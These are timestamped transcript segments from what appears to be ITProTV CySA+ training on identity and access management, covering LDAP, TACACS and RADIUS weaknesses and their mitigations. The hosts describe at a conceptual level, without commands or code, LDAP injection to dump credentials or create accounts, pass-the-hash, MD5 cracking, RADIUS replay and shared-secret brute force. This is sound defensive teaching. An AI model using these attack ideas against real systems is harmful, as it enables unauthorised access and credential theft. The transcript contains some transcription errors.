gonna require\nthat when you wanna enumerate.\n\n467\n00:24:26.953 --> 00:24:30.650\nIf a service needs to enumerate users, it\nmight need access to your LDAP directory\n\n468\n00:24:30.650 --> 00:24:33.870\nto do that, and\nwhether that's authenticated or not.\n\n469\n00:24:33.870 --> 00:24:37.046\nSo there are times when I guess you kinda\nhave to have this in place, but it's\n\n470\n00:24:37.046 --> 00:24:39.076\ndefinitely a risk you need to be aware of.\n&gt;&gt; Yeah,\n\n471\n00:24:39.076 --> 00:24:41.107\nit's definitely a risk that\nyou need to be aware of.\n\n472\n00:24:41.107 --> 00:24:45.778\nWell, or, is it enabled?\n\n473\n00:24:45.778 --> 00:24:47.980\nMaybe everybody's authenticating,\nlike a normal person.\n\n474\n00:24:47.980 --> 00:24:51.260\nThey've got a username and\npassword, great, fine.\n\n475\n00:24:51.260 --> 00:24:56.868\nBut what if I have anonymous or\nunauthenticated access enabled.\n\n476\n00:24:56.868 --> 00:24:59.044\nAnd it goes, I don't recognize that but\n\n477\n00:24:59.044 --> 00:25:01.483\nhey we do unauthorized\naccess anyway [LAUGH].\n\n478\n00:25:01.483 --> 00:25:04.474\nSo there you go, have fun.\n\n479\n00:25:04.474 --> 00:25:05.893\nNo.\n&gt;&gt; [INAUDIBLE]\n\n480\n00:25:05.893 --> 00:25:06.829\n&gt;&gt; No, not a good thing.\n\n481\n00:25:06.829 --> 00:25:09.465\nSo you probably wanna go in there and\ndisable those things.\n\n482\n00:25:09.465 --> 00:25:11.505\nAnd maybe if you're in\na testing environment or\n\n483\n00:25:11.505 --> 00:25:15.129\nsomething like that where you don't wanna\nhave to deal with authenticated logins.\n\n484\n00:25:15.129 --> 00:25:16.035\nYou could enable that stuff.\n\n485\n00:25:16.035 --> 00:25:18.297\nBut in production,\nthis is probably a bad idea.\n\n486\n00:25:18.297 --> 00:25:24.870\nWhen I say probably, I'm like, go the 99s\nkind of ideas, almost every time.\n\n487\n00:25:24.870 --> 00:25:26.380\nYou don't wanna be doing that.\n\n488\n00:25:26.380 --> 00:25:28.509\nSo disable those.\n\n489\n00:25:28.509 --> 00:25:33.695\nRequire authenticated authorization,\nthe system, right?\n\n490\n00:25:33.695 --> 00:25:38.447\nUse encryption, supports TLS encryption.\n\n491\n00:25:38.447 --> 00:25:42.410\nTLS is a great encryption, go for that,\nuse that, employ that end-to-end, right?\n\n492\n00:25:44.230 --> 00:25:46.970\nThere is also LDAP Injection Attacks.\n\n493\n00:25:46.970 --> 00:25:50.680\nNow, I mentioned you could see LDAP\ninside of websites as it happens.\n\n494\n00:25:50.680 --> 00:25:53.580\nThey use LDAP as their query language for\n\n495\n00:25:53.580 --> 00:25:57.130\nrunning queries to the LDAP back end,\nbring you information to the front end.\n\n496\n00:25:58.140 --> 00:26:01.190\nWell, we've seen with SQL injection\nthat that can be dangerous if\n\n497\n00:26:01.190 --> 00:26:05.290\nwe're not sanitizing what\nis going into the system.\n\n498\n00:26:05.290 --> 00:26:07.661\nWell, I'm able to query the LDAP.\n\n499\n00:26:07.661 --> 00:26:09.688\nHey, what's Mike's username and password?\n\n500\n00:26:09.688 --> 00:26:12.610\nOr just give me username and passwords.\n&gt;&gt; Or create a new account.\n\n501\n00:26:12.610 --> 00:26:13.899\nI can't break one of\nthe existing accounts.\n\n502\n00:26:13.899 --> 00:26:17.331\nBut, hey, look, I can write an LDAP\nquery or two, create a new record-\n\n503\n00:26:17.331 --> 00:26:17.844\n&gt;&gt; Exactly.\n\n504\n00:26:17.844 --> 00:26:18.739\n&gt;&gt; Where I do know the password.\n\n505\n00:26:18.739 --> 00:26:21.684\n&gt;&gt; So if you're not looking at that data\n\n506\n00:26:21.684 --> 00:26:23.869\nas it comes in, and going,\n\n507\n00:26:23.869 --> 00:26:29.200\nwhy are they sending me LDAP queries\nof creation of user accounts?\n\n508\n00:26:29.200 --> 00:26:32.740\nYou're not sanitizing that,\ngetting control over it.\n\n509\n00:26:32.740 --> 00:26:36.532\nThen you're leaving yourself open for an\ninjection attack, where I can inject those\n\n510\n00:26:36.532 --> 00:26:39.744\nLDAP queries, create a new user,\nsend me back a list of the usernames and\n\n511\n00:26:39.744 --> 00:26:42.165\npasswords that you have.\n&gt;&gt;

It's a hashing algorithm.\n\n525\n00:27:17.253 --> 00:27:21.357\nThey basically go in they hash and\nsalt the value,\n\n526\n00:27:21.357 --> 00:27:24.200\nkind of obfuscate it a little bit.\n\n527\n00:27:24.200 --> 00:27:27.840\nAnd maybe I'm able to use an injection\nattack and grab that and pull it back and\n\n528\n00:27:27.840 --> 00:27:29.184\nthen I can try and crack it but\n\n529\n00:27:29.184 --> 00:27:32.270\nwhat if I told you that you didn't\neven actually have to crack it?\n\n530\n00:27:33.270 --> 00:27:37.625\nJust by the fact that you had the hash\nvalue itself, a lot of times when it does\n\n531\n00:27:37.625 --> 00:27:42.665\nauthentication LDAP, it doesn't actually\ndecipher or unencrypt, I guess is the only\n\n532\n00:27:42.665 --> 00:27:45.196\nkind of way I could think about it.\n&gt;&gt; Yeah.\n\n533\n00:27:45.196 --> 00:27:46.892\n&gt;&gt; Unencrypt the passwords,\n\n534\n00:27:46.892 --> 00:27:50.287\nit just looks at the hash values and\nsees if they match.\n\n535\n00:27:50.287 --> 00:27:51.828\nSo if I pass it a hash value,\n\n536\n00:27:51.828 --> 00:27:54.920\nI have no idea what's under\nthe hood of the hash value.\n\n537\n00:27:54.920 --> 00:27:56.751\nI just know it's a password.\n&gt;&gt;

This also brings you into that crazy\n\n555\n00:28:38.245 --> 00:28:39.579\nworld of where, wait,\n\n556\n00:28:39.579 --> 00:28:41.989\na pin can be more secure than my password.\n&gt;&gt; Yeah,\n\n557\n00:28:41.989 --> 00:28:43.385\n[LAUGH] that's funny.\n&gt;&gt; But in the end,\n\n558\n00:28:43.385 --> 00:28:46.462\nbecause of things like this,\nit absolutely can be.\n\n559\n00:28:46.462 --> 00:28:50.216\nBecause that pin is associated with\nthis device and if you capture it,\n\n560\n00:28:50.216 --> 00:28:52.454\nyou can't use it anywhere else, right?\n\n561\n00:28:52.454 --> 00:28:55.331\nIn fact, it's not being sent,\nit's being checked on my local system,\n\n562\n00:28:55.331 --> 00:28:57.268\nso.\n&gt;&gt; Now to be fully disclosure here,\n\n563\n00:28:57.268 --> 00:28:59.193\nthis is a very difficult\nattack to pull off.\n\n564\n00:28:59.193 --> 00:29:02.630\nYou already have to have some\nsort of access Grab those hashes,\n\n565\n00:29:02.630 --> 00:29:03.780\nwhich is also difficult.\n\n566\n00:29:05.050 --> 00:29:06.750\nSo it's a very advanced style attack.\n\n567\n00:29:06.750 --> 00:29:09.780\nBut it does exist and\nyou do need to be aware of it.\n\n568\n00:29:09.780 --> 00:29:12.990\nJust one of the great mitigation\ncontrols that we have\n\n569\n00:29:12.990 --> 00:29:17.350\ninside of the LDAP system itself is\nthe fact that you can create ACLs.\n\n570\n00:29:17.350 --> 00:29:23.246\nYou can say, I'm able to control\nthe access to a directory object,\n\n571\n00:29:23.246 --> 00:29:29.358\nand/or I'm able to control\nthe modification of a directory object.\n\n572\n00:29:29.358 --> 00:29:32.230\nI mean not just access to it, but\nwhat about changes made to it, right?\n\n573\n00:29:32.230 --> 00:29:35.100\nI'm able to create those ACLs,\nput them in place and\n\n574\n00:29:35.100 --> 00:29:38.800\ntry to holistically take\na look at my environment.\n\n575\n00:29:38.800 --> 00:29:40.590\nFigure out where the weak spots are,\n\n576\n00:29:40.590 --> 00:29:43.419\ncreate those ACLs,\nset them in place and now Mike no longer\n\n577\n00:29:43.419 --> 00:29:47.317\nhas access to very sensitive information\nbecause he doesn't need to, right?\n\n578\n00:29:47.317 --> 00:29:49.811\nThat principle of least privilege.\n\n579\n00:29:49.811 --> 00:29:50.461\nI'm gonna mess that up.\n\n580\n00:29:50.461 --> 00:29:54.980\nPrinciple of least privilege comes into\nplay and I can use ACLs to implement that.\n\n581\n00:29:54.980 --> 00:29:56.903\nSo it is a part of the system.\n\n582\n00:29:56.903 --> 00:29:58.445\nIt's a great mitigation technique.\n\n583\n00:29:58.445 --> 00:30:00.949\nSo go throughout your systems, make sure\nthat you're implementing it as best as you\n\n584\n00:30:00.949 --> 00:30:03.214\npossibly can.\n&gt;&gt; And then back to monitoring,\n\n585\n00:30:03.214 --> 00:30:06.155\nI know you've stressed this over and\nover and over again.\n\n586\n00:30:06.155 --> 00:30:06.730\n&gt;&gt; Wouldn't be a show without it would it?\n\n587\n00:30:06.730 --> 00:30:07.783\n&gt;&gt; It wouldn't, right?\n\n588\n00:30:07.783 --> 00:30:09.136\nWe have to mention it at least once.\n\n589\n00:30:09.136 --> 00:30:13.315\nBut you should be aware when somebody\ngets added to the domain admins group.\n\n590\n00:30:13.315 --> 00:30:17.526\nYou should be updated or something should\nlet you know or something should at least\n\n591\n00:30:17.526 --> 00:30:20.882\nbe logged when people are making\nchanges to group memberships and\n\n592\n00:30:20.882 --> 00:30:24.198\nobjects in Active Directory or\ndirectory services in general.\n\n593\n00:30:24.198 --> 00:30:26.008\nI need to know when those\nchanges are being made.\n\n594\n00:30:26.008 --> 00:30:26.698\n&gt;&gt; Exactly.\n\n595\n00:30:26.698 --> 00:30:28.772\nMike, you nailed it again and we got it.\n\n596\n00:30:28.772 --> 00:30:31.548\nAgain, monitoring is like\na day without sunshine.\n\n597\n00:30:31.548 --> 00:30:32.078\n&gt;&gt; [LAUGH]\n\n598\n00:30:32.078 --> 00:30:33.319\n&gt;&gt; You got to watch these things,\n\n599\n00:30:33.319 --> 00:30:34.137\nkeep an eye on them.\n\n600\n00:30:34.137 --> 00:30:36.520\nSo bring up your event viewers,\nbring up your sys logs.\n\n601\n00:30:36.520 --> 00:30:39.643\nWhatever the case is that's watching this.\n\n602\n00:30:39.643 --> 00:30:45.084\nAnd peruse through, see, hey, what's all\nthese failures to access the system?\n\n603\n00:30:45.084 --> 00:30:48.036\nMaybe this should be a key that\nI'm looking into something, right?\n\n604\n00:30:48.036 --> 00:30:50.709\nMike, that being said our time\nis short for this episode.\n\n605\n00:30:50.709 --> 00:30:53.182\nWe've got plenty to go for another one.\n\n606\n00:30:53.182 --> 00:30:56.841\nSo part two, here we come,\nat least later, not now.\n\n607\n00:30:56.841 --> 00:30:58.224\n[LAUGH]\n&gt;&gt; All right,\n\n608\n00:30:58.224 --> 00:31:01.764\nwell you heard it from the man himself,\nwe do have more to go.\n\n609\n00:31:01.764 --> 00:31:04.383\nSo that means there will be a part two but\npart one is done.\n\n610\n00:31:04.383 --> 00:31:08.374\nSo for now, signing off for ITProTV,\nI've been your host Mike Rodrick.\n\n611\n00:31:08.374 --> 00:31:09.186\n&gt;&gt; I'm Daniel Lowrie.\n\n612\n00:31:09.186 --> 00:31:10.369\n&gt;&gt; And we'll see you next time.\n\n613\n00:31:10.369 --> 00:31:17.439\n[MUSIC]\n\n614\n00:31:17.439 --> 00:31:20.251\n&gt;&gt; Thank you for watching ITProTV.\n\n",

Thank you for having me, Michael.\n\n14\n00:00:31.540 --> 00:00:33.620\nAlways a pleasure to be here with you and\n\n15\n00:00:33.620 --> 00:00:37.500\nthe good folks at home watching\neither live or recorded.\n\n16\n00:00:37.500 --> 00:00:38.460\nWe appreciate you all.\n\n17\n00:00:38.460 --> 00:00:40.430\nBut we're back for more on our CySA+.\n\n18\n00:00:40.430 --> 00:00:43.830\nWe did leave off with ELD App\nin our previous episode, but\n\n19\n00:00:43.830 --> 00:00:46.170\nwe're gonna jump right\nback into the action here.\n\n20\n00:00:46.170 --> 00:00:50.080\nGet back into the fray so that we can get\nthrough all this wonderful information\n\n21\n00:00:50.080 --> 00:00:53.260\nthey want you to know for\nIdentity and Access Management.\n\n22\n00:00:53.260 --> 00:00:55.950\nLooking into TACACS, that's where\nwe're gonna kick it off, Mike.\n\n23\n00:00:55.950 --> 00:00:57.530\nI know you're familiar with that guy.\n\n24\n00:00:57.530 --> 00:01:00.970\nCisco proprietary protocol,\nyou got TACACS, you got TACACS+.\n\n25\n00:01:00.970 --> 00:01:04.850\nGood news here, you don't really need to\nknow the difference between those two.\n\n26\n00:01:04.850 --> 00:01:07.790\nYou just need to understand\nwhat TACACS is which\n\n27\n00:01:07.790 --> 00:01:12.310\nis the Terminal Access Controller\nAccess Control System.\n\n28\n00:01:12.310 --> 00:01:13.850\n&gt;&gt; Good job.\n&gt;&gt; I think I got that right.\n\n29\n00:01:13.850 --> 00:01:14.770\n&gt;&gt; Nailed it all, for sure.\n\n30\n00:01:14.770 --> 00:01:17.680\n&gt;&gt; It's all the access control\nstuff always throws me\n\n31\n00:01:17.680 --> 00:01:22.690\noff [LAUGH] which what is I can't no\nno but, basically is a system for\n\n32\n00:01:22.690 --> 00:01:25.240\nauthentication just\nTriple A type services.\n\n33\n00:01:25.240 --> 00:01:27.138\nWe see this inside of Cisco routers a lot.\n\n34\n00:01:27.138 --> 00:01:29.340\n[COUGH] Excuse me.\n\n35\n00:01:29.340 --> 00:01:34.580\nBut we need to talk about the issues that\nwe might encounter when using TACACS.\n\n36\n00:01:34.580 --> 00:01:39.305\nOne of the things that I need to take away\nthat I have to look for security wise,\n\n37\n00:01:39.305 --> 00:01:41.430\nhow can I be more security minded?\n\n38\n00:01:41.430 --> 00:01:45.000\nWhat can I do to medicate maybe some\nsecurity issues that we find in there.\n\n39\n00:01:45.000 --> 00:01:46.640\nThat's what we need to take a look at.\n\n40\n00:01:46.640 --> 00:01:47.300\nSo, let's start there.\n\n41\n00:01:47.300 --> 00:01:49.510\nWe're gonna start with\nlack of integrity checks.\n\n42\n00:01:49.510 --> 00:01:54.830\nOkay, so I was researching like how secure\nis TACACS, what's the big problems?\n\n43\n00:01:54.830 --> 00:01:59.980\nAnd apparently it has,\nwhat I can find, one integrity check.\n\n44\n00:01:59.980 --> 00:02:01.560\nAnd it's basically, I wrote this down,\n\n45\n00:02:01.560 --> 00:02:05.910\nthe sum of the component length\nmatches the total size of the packet.\n\n46\n00:02:05.910 --> 00:02:07.240\nThat's the one check that it does.\n\n47\n00:02:07.240 --> 00:02:09.590\n&gt;&gt; Interesting.\n&gt;&gt; Yeah, it's very interesting.\n\n48\n00:02:09.590 --> 00:02:11.080\n&gt;&gt; But it's not very thorough.\n\n49\n00:02:11.080 --> 00:02:14.824\n&gt;&gt; No, and\nbecause we have lack of integrity checks,\n\n50\n00:02:14.824 --> 00:02:18.222\nthat means that there is\nprime opportunity for\n\n51\n00:02:18.222 --> 00:02:22.940\nan attacker to be able to inject\nin to modify or spoof something.\n\n52\n00:02:22.940 --> 00:02:25.649\n&gt;&gt; Right, cuz the integrity check,\nthe whole point is to make sure things\n\n53\n00:02:25.649 --> 00:02:26.480\naren't modified-\n&gt;&gt; Correct.\n\n54\n00:02:26.480 --> 00:02:28.790\n&gt;&gt; Unintentionally or maliciously.\n\n55\n00:02:28.790 --> 00:02:31.250\n&gt;&gt; That's right.\n&gt;&gt; So if it's not checking-\n\n56\n00:02:31.250 --> 00:02:32.800\n&gt;&gt; Then you might have a bad day,\n\n57\n00:02:32.800 --> 00:02:33.620\nI think so.\n\n58\n00:02:33.620 --> 00:02:36.830\nAn attacker, maybe they get onto\nthe wire some way, shape or form.\n\n59\n00:02:36.830 --> 00:02:38.810\nThey're able to sniff that traffic.\n\n60\n00:02:38.810 --> 00:02:41.955\nAnd be able to do some sort\nof modification in line,\n\n61\n00:02:41.955 --> 00:02:43.980\nman-in-the-middle kind of business, right?\n\n62\n00:02:43.980 --> 00:02:47.260\nThat's what we wanna avoid or\nmay be even perform a relay or\n\n63\n00:02:47.260 --> 00:02:49.490\na replay type of attack, right?\n\n64\n00:02:49.490 --> 00:02:51.180\nAnd also employs weak encryption.\n\n65\n00:02:52.400 --> 00:02:54.320\nNot great stuff there, right?\n\n66\n00:02:54.320 --> 00:02:56.180\nSo because of these things,\n\n67\n00:02:56.180 --> 00:03:00.560\nwe're gonna want to isolate any\nsystems that are employing TACACS.\n\n68\n00:03:00.560 --> 00:03:05.400\nSo if you have some sort of system that\nis using Triple A services of the TACACS\n\n69\n00:03:05.400 --> 00:03:09.890\nvariety, make sure that it's\nlike an administrative area or\n\n70\n00:03:09.890 --> 00:03:12.975\nonly administrators\nare allowed to have access to.\n\n71\n00:03:12.975 --> 00:03:18.310\nAnd so, basically reducing the attack\nsurface, the availability to it,\n\n72\n00:03:18.310 --> 00:03:22.670\nto an attack of it, to an attack I should\nsay, giving them the prime opportunity to\n\n73\n00:03:22.670 --> 00:03:25.220\ntry to exploit some of\nthe weaknesses that they find there.\n\n74\n00:03:25.220 --> 00:03:29.870\nSo network isolation,\nsegmentation is always recommended.\n\n75\n00:03:29.870 --> 00:03:35.200\nUse a strong password, right,\nbecause in the encryption in it is weak.\n\n76\n00:03:35.200 --> 00:03:39.870\nWe as the users of it\nshould be doing the best\n\n77\n00:03:39.870 --> 00:03:44.590\njob we can to try to help that along and\ngive it more robustness.\n\n78\n00:03:44.590 --> 00:03:48.630\nSo, while if it, I think its using\nMD5 in some way, shape or form.\n\n79\n00:03:48.630 --> 00:03:51.580\nWhich MD5 is very easily bypassed, right?\n\n80\n00:03:53.120 --> 00:03:55.590\nI can get an MD5 hash value.\n\n81\n00:03:55.590 --> 00:03:58.110\nThrow that into most password crackers.\n\n82\n00:03:58.110 --> 00:04:00.730\nAnd if your password is on a dictionary,\n\n83\n00:04:00.730 --> 00:04:02.300\nit can be able to hash\nthe values together.\n\n84\n00:04:02.300 --> 00:04:03.450\nLook and see if it's the same.\n\n85\n00:04:03.450 --> 00:04:05.420\nIf it is, boom, it's got your hash value.\n\n86\n00:04:05.420 --> 00:04:08.030\nRainbow tables are out there for\nthese things as well.\n\n87\n00:04:08.030 --> 00:04:10.680\nGo online through a hash value and\nthere are no define hash and\n\n88\n00:04:10.680 --> 00:04:13.820\nlike, and a checker online.\n\n89\n00:04:13.820 --> 00:04:18.090\nThose rainbow tables were there and\nsays, yeah, that's password one, right?\n\n90\n00:04:18.090 --> 00:04:19.320\nIt cracks it for you.\n\n91\n00:04:19.320 --> 00:04:22.980\nJust what do we do,\nwe don't use words like password one.\n\n92\n00:04:22.980 --> 00:04:27.120\nWe don't use commonly, you trying to\nmake them as lengthy as possible,\n\n93\n00:04:27.120 --> 00:04:28.635\nas complex as possible.\n\n94\n00:04:28.635 --> 00:04:34.290\nWhatever the stipulations will be around\nthat are the constraints should I say,\n\n95\n00:04:34.290 --> 00:04:36.450\nto the passwording system.\n\n96\n00:04:36.450 --> 00:04:38.970\nUse as much as you can and\nthen make it as long as you can.\n\n97\n00:04:38.970 --> 00:04:43.040\nOkay, so that way if someone is able to\nsnip that wire, is able to grab that and\n\n98\n00:04:43.040 --> 00:04:45.130\nstarts to decrypt or attempt to decrypt.\n\n99\n00:04:45.130 --> 00:04:50.110\nThey're gonna have a much harder time at\nit because we've employed stronger reads\n\n100\n00:04:50.110 --> 00:04:51.578\nthat we can do as the end user.\n\n101\n00:04:51.578 --> 00:04:55.280\nAll right, I think that's just about it.\n\n102\n00:04:55.280 --> 00:04:57.542\nThey don't get into a whole lot of\ndetail when it comes to TACACS.\n\n103\n00:04:57.542 --> 00:04:58.500\n&gt;&gt; Good.\n\n104\n00:04:58.500 --> 00:04:59.020\n&gt;&gt; Also RADIUS, as well.\n\n105\n00:04:59.020 --> 00:05:02.071\n&gt;&gt; Yeah, just understanding what\nthose vulnerabilities are in case you\n\n106\n00:05:02.071 --> 00:05:02.800\nget asked that.\n\n107\n00:05:02.800 --> 00:05:06.701\nAnd understanding like TACACS+ obviously,\neliminate or not eliminate but\n\n108\n00:05:06.701 --> 00:05:10.733\ntry to mitigate many of those by\nintroducing multi-factor authentications.\n\n109\n00:05:10.733 --> 00:05:11.560\n&gt;&gt; Correct.\n\n110\n00:05:11.560 --> 00:05:13.400\n&gt;&gt; Stronger encryption methods and\nthings like that.\n\n111\n00:05:13.400 --> 00:05:14.100\n&gt;&gt; They're working on it.\n\n112\n00:05:14.100 --> 00:05:15.590\n&gt;&gt; Yeah.\n&gt;&gt; They're trying, right.\n\n113\n00:05:15.590 --> 00:05:17.440\nBut again, there you go.\n\n114\n00:05:17.440 --> 00:05:19.130\nRADIUS is another Triple A service.\n\n115\n00:05:19.130 --> 00:05:20.310\nMike and I were talking about this.\n\n116\n00:05:20.310 --> 00:05:22.610\nHe's actually got to do some\nRADIUS implementations.\n\n117\n00:05:22.610 --> 00:05:24.780\nI've never really had to\nwork with it that much.\n\n118\n00:05:24.780 --> 00:05:28.960\nBut it is very common out there in the\nsphere, so you do need to be aware of it.\n\n119\n00:05:28.960 --> 00:05:31.251\nRemote Authentication\nDial-In User Service.\n\n120\n00:05:31.251 --> 00:05:33.110\n&gt;&gt; Mm-hm, good one.\n\n121\n00:05:33.110 --> 00:05:34.500\nOoh, I like that.\n\n122\n00:05:34.500 --> 00:05:36.210\n&gt;&gt; Like that [LAUGH]\n&gt;&gt; Now, it's funny.\n\n123\n00:05:36.210 --> 00:05:39.305\nWhen I worked at insurance company,\nwe did have a RADIUS server.\n\n124\n00:05:39.305 --> 00:05:40.020\n&gt;&gt; Uh-huh.\n&gt;&gt; Right?\n\n125\n00:05:40.020 --> 00:05:43.746\nI think it had 12 or 15 phone connections.\n\n126\n00:05:43.746 --> 00:05:44.698\n&gt;&gt; Yeah.\n\n127\n00:05:44.698 --> 00:05:46.388\n&gt;&gt; RADIUS were dial-in, right.\n\n128\n00:05:46.388 --> 00:05:47.213\n&gt;&gt; Yes.\n\n129\n00:05:47.213 --> 00:05:48.019\n&gt;&gt; This is dial-in.\n\n130\n00:05:48.019 --> 00:05:50.530\n&gt;&gt; [LAUGH]\n&gt;&gt; It tells you how old the technology is.\n\n131\n00:05:50.530 --> 00:05:52.433\n&gt;&gt; It's been around for\na little while, right.\n\n132\n00:05:52.433 --> 00:05:55.772\nBecause even though we don't use dial-in\nthat much, I know interesting stories with\n\n133\n00:05:55.772 --> 00:05:58.483\nyou and the insurance company and\nwhile you still have phone line but.\n\n134\n00:05:58.483 --> 00:06:01.169\nYeah, it's part of the name\ndoesn't mean it always support,\n\n135\n00:06:01.169 --> 00:06:04.590\nit does support obviously newer\ntechnologies but the name still remains.\n\n136\n00:06:04.590 --> 00:06:05.640\n&gt;&gt; Yeah, sure it does.\n\n137\n00:06:05.640 --> 00:06:09.956\nAnd they still bring it up and you need to\nknow a little bit about it just because\n\n138\n00:06:09.956 --> 00:06:12.440\nthink critical infrastructure, right?\n\n139\n00:06:12.440 --> 00:06:14.850\nThe phone systems in the United States and\n\n140\n00:06:14.850 --> 00:06:18.560\nprobably other countries as well,\nis a critical system.\n\n141\n00:06:18.560 --> 00:06:20.060\nAnd when disasters happen,\n\n142\n00:06:20.060 --> 00:06:24.290\nit's one of the first systems to come\nback online if it even goes down, okay.\n\n143\n00:06:24.290 --> 00:06:28.810\nSo, what's an easy way to get at\nleast some networking connectivity\n\n144\n00:06:28.810 --> 00:06:29.620\nback up and running?\n\n145\n00:06:29.620 --> 00:06:34.110\nThis is why the insurance company that I\nwork for kept a RADIUS server around, so\n\n146\n00:06:34.110 --> 00:06:36.680\nthat when hurricanes would\noccur they could go down,\n\n147\n00:06:36.680 --> 00:06:38.698\nhave a mobile claim station.\n\n148\n00:06:38.698 --> 00:06:41.490\nAnd use dial-up services to gain access,\n\n149\n00:06:41.490 --> 00:06:44.630\nalthough limited,\nback to our internal network.\n\n150\n00:06:44.630 --> 00:06:48.560\nSo it still can be around so\nyou do need to know a little bit about it.\n\n151\n00:06:48.560 --> 00:06:50.822\n&gt;&gt; It's also one of those things\nthat tends to be forgotten,\n\n152\n00:06:50.822 --> 00:06:53.743\ncuz we don't think about phone lines,\nand modems, and things like that.\n\n153\n00:06:53.743 --> 00:06:55.290\n&gt;&gt; [LAUGH] Yeah, it sits in a closet.\n\n154\n00:06:55.290 --> 00:06:56.105\nIt's not updated.\n\n155\n00:06:56.105 --> 00:06:58.680\n&gt;&gt; Yeah.\n&gt;&gt; It's not upgraded, it's not patched,\n\n156\n00:06:58.680 --> 00:07:02.250\nit's not thought about, and it's this\nhuge gaping vulnerability in your system.\n\n157\n00:07:02.250 --> 00:07:05.585\n&gt;&gt; Exactly, so\nthere's security lesson number one.\n\n158\n00:07:05.585 --> 00:07:07.702\n&gt;&gt; [LAUGH]\n&gt;&gt; Don't forget it's there.\n\n159\n00:07:07.702 --> 00:07:09.430\n[LAUGH]\n&gt;&gt; [LAUGH] Right?\n\n160\n00:07:09.430 --> 00:07:12.660\n&gt;&gt; Don't act likes it's out of sight,\nout of mind.\n\n161\n00:07:12.660 --> 00:07:16.600\nYou always want something, have some\nscheduled time where you go in and\n\n162\n00:07:16.600 --> 00:07:22.000\nyou verify that all the system is updated,\nand patched and\n\n163\n00:07:22.000 --> 00:07:27.250\nas non-vulnerable as it can be through\nthose means cuz it's a service, right.\n\n164\n00:07:27.250 --> 00:07:31.849\nAlso is prone to session replay tax\nas well, attacker sniffs the traffic,\n\n165\n00:07:31.849 --> 00:07:35.510\nthey learn what the legit request and\nresponses look like.\n\n166\n00:07:35.510 --> 00:07:38.672\nAnd they can even predict what\nthey'll be in the future based\n\n167\n00:07:38.672 --> 00:07:42.590\noff the algorithm that you used to\ngenerate both the request and response.\n\n168\n00:07:42.590 --> 00:07:45.110\nIf I can grab what that is,\n\n169\n00:07:45.110 --> 00:07:51.520\nI am then able to impersonate\neither the client or the server.\n\n170\n00:07:51.520 --> 00:07:54.033\nAnd respond accordingly to\neither the client or the server,\n\n171\n00:07:54.033 --> 00:07:56.504\nwhatever you're looking for\nto get those replay attacks.\n\n172\n00:07:56.504 --> 00:08:00.645\nThere's a shared secret brute force\nthis is the thing that kind of make\n\n173\n00:08:00.645 --> 00:08:05.556\neverything a secret inside the system Yeah\nyour RADIUS clients, your VPN server,\n\n174\n00:08:05.556 --> 00:08:09.908\nyour wireless access point that\nare connecting to your RADIUS server have\n\n175\n00:08:09.908 --> 00:08:13.810\nthat shared secret between them\nwhich is again just a password.\n\n176\n00:08:13.810 --> 00:08:15.190\n&gt;&gt; Right.\n&gt;&gt; So if I can brute force that cuz\n\n177\n00:08:15.190 --> 00:08:16.535\na lot of us get real lazy.\n\n178\n00:08:16.535 --> 00:08:18.270\n&gt;&gt; [LAUGH]\n&gt;&gt; And we just put a short,\n\n179\n00:08:18.270 --> 00:08:20.870\neasy to remember password in there.\n\n180\n00:08:20.870 --> 00:08:22.130\nAnd then we never change it, right?\n\n181\n00:08:22.130 --> 00:08:23.640\nIt's again one of those things.\n\n182\n00:08:23.640 --> 00:08:25.190\nI don't get that reminder every 30 days.\n\n183\n00:08:25.190 --> 00:08:27.060\n&gt;&gt; Yeah.\n&gt;&gt; Hey, it's time to change your password\n\n184\n00:08:27.060 --> 00:08:28.450\non your RADIUS server.\n\n185\n00:08:28.450 --> 00:08:31.240\nYou need to make your own,\nschedule a task to remember to do that.\n\n186\n00:08:31.240 --> 00:08:31.990\n&gt;&gt; That's right, right.\n\n187\n00:08:31.990 --> 00:08:33.250\nSo set those up.\n\n188\n00:08:33.250 --> 00:08:34.280\nYou can also use encryption.\n\n189\n00:08:34.280 --> 00:08:35.980\nIt does support TLS encryption.\n\n190\n00:08:35.980 --> 00:08:39.030\nSo if you do encryption from end to end,\nthis should be.\n\n191\n00:08:39.030 --> 00:08:41.510\nAnd that's an important part of that,\nby the way.\n\n192\n00:08:41.510 --> 00:08:42.960\nEnd to end.\n\n193\n00:08:42.960 --> 00:08:43.760\nFrom one end to the other.\n\n194\n00:08:43.760 --> 00:08:46.660\nIf you ever get into unencrypted area,\n\n195\n00:08:46.660 --> 00:08:49.690\nas the RADIUS data is passing through it,\nguess what,\n\n196\n00:08:49.690 --> 00:08:53.530\nall those lovely attacks that we've just\nmentioned are now back on the table.\n\n197\n00:08:53.530 --> 00:08:57.396\nSo, make sure if you're\ngonna use encryption,\n\n198\n00:08:57.396 --> 00:09:00.520\ndon't go half cocked on it, go all in.\n\n199\n00:09:00.520 --> 00:09:01.810\nPush your chips to\nthe middle of the table and\n\n200\n00:09:01.810 --> 00:09:05.410\nsay, we're gonna encrypt this from one\nend of the spectrum to the other, so\n\n201\n00:09:05.410 --> 00:09:09.010\nthat data is always safe,\nwhile it's on the wire.\n\n202\n00:09:09.010 --> 00:09:12.200\nAll right, I think it's also prone\nto denial of service attacks,\n\n203\n00:09:12.200 --> 00:09:13.560\nwhich, what's not, right?\n\n204\n00:09:13.560 --> 00:09:15.100\nWhat's not prone to denial of service?\n\n205\n00:09:15.100 --> 00:09:20.990\nAll right Mike that should do it for\nidentity repositories and that good stuff.\n\n206\n00:09:20.990 --> 00:09:24.890\nWe're gonna move into security issues\nassociated with federation services and\n\n207\n00:09:24.890 --> 00:09:26.360\nsingle sign on.\n\n208\n00:09:26.360 --> 00:09:28.864\nOr federated services I guess\nis more properly known, but\n\n209\n00:09:28.864 --> 00:09:30.456\njust federation and single sign on.\n\n210\n00:09:30.456 --> 00:09:31.226\nSorry I had an eyelash.\n\n211\n00:09:31.226 --> 00:09:32.530\nExcuse me.\n\n212\n00:09:32.530 --> 00:09:36.310\n&gt;&gt; [LAUGH]\n&gt;&gt; But let's talk about that.\n\n213\n00:09:36.310 --> 00:09:37.250\nFederated services.\n\n214\n00:09:37.250 --> 00:09:39.370\nWhat is this single sign on?\n\n215\n00:09:39.370 --> 00:09:40.100\nYou're not aware.\n\n216\n00:09:40.100 --> 00:09:44.640\nFederated service is basically the ability\nto say, let's put it this way.\n\n217\n00:09:44.640 --> 00:09:45.760\nWe'll make a scenario.\n\n218\n00:09:45.760 --> 00:09:46.890\nI'm Organization A.\n\n219\n00:09:46.890 --> 00:09:48.520\nMike's Company B.\n\n220\n00:09:48.520 --> 00:09:49.430\nAll of a sudden, Mike,\n\n221\n00:09:49.430 --> 00:09:52.910\nyou know 